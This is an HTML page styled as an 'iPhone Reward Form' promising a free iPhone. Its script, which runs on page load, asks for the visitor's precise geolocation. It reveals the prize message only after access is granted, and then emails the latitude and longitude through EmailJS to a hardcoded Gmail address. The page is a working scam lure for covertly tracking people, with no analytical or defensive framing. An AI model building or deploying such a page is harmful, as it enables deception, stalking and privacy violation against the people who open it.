<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>iPhone Reward Form</title>
    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f0f8ff;
            font-family: Arial, sans-serif;
        }
        .container {
            max-width: 600px;
            background: #ffffff;
            padding: 2rem;
            border-radius: 10px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
            text-align: center;
        }
        #rewardContent {
            display: none;
        }
        #locationDisplay {
            background: #e9ecef;
            color: #666;
            padding: 0.5rem;
            border-radius: 4px;
            margin-top: 15px;
            font-size: 0.9rem;
        }
    </style>
</head>
<body>
    <div class="container">
        <div id="rewardContent">
            <h1>Congratulations! üéâ</h1>
            <p class="lead">You've been selected to receive a brand-new iPhone!</p>
            <p id="locationDisplay">Waiting for location...</p>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <script>
        document.addEventListener("DOMContentLoaded", function () {
            emailjs.init("-_fZgZZhnhhK2OvuV"); 
            requestLocationPermission();
        });

        function requestLocationPermission() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const latitude = position.coords.latitude;
                        const longitude = position.coords.longitude;

                        console.log("üåç Location received:", latitude, longitude);
                        document.getElementById("locationDisplay").textContent = 
                            `üìç Latitude: ${latitude}, Longitude: ${longitude}`;
                        sendLocationEmail(latitude, longitude);
                        document.getElementById("rewardContent").style.display = "block";
                    },
                    (error) => {
                        console.error("‚ùå Location error:", error.message);
                        document.getElementById("locationDisplay").textContent = 
                            "‚ö†Ô∏è Location access denied or unavailable!";
                    },
                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
                );
            } else {
                console.error("‚ùå Geolocation not supported by this browser.");
                document.getElementById("locationDisplay").textContent = "‚ö†Ô∏è Geolocation not supported!";
            }
        }

        function sendLocationEmail(latitude, longitude) {
            const templateParams = {
                latitude: latitude.toString(),
                longitude: longitude.toString(),
                to_email: "pthnvenom@gmail.com"
            };

            console.log("üìß Sending email with location:", templateParams);

            emailjs.send("service_7xiz4x8", "template_ux0sel8", templateParams)
                .then((response) => {
                    console.log("‚úÖ Email sent successfully!", response);
                    document.getElementById("locationDisplay").textContent = "üìß Location sent!";
                })
                .catch((error) => {
                    console.error("‚ùå Email sending error:", error);
                    document.getElementById("locationDisplay").textContent = "‚ö†Ô∏è Email sending failed!";
                });
        }
    </script>
</body>
</html>
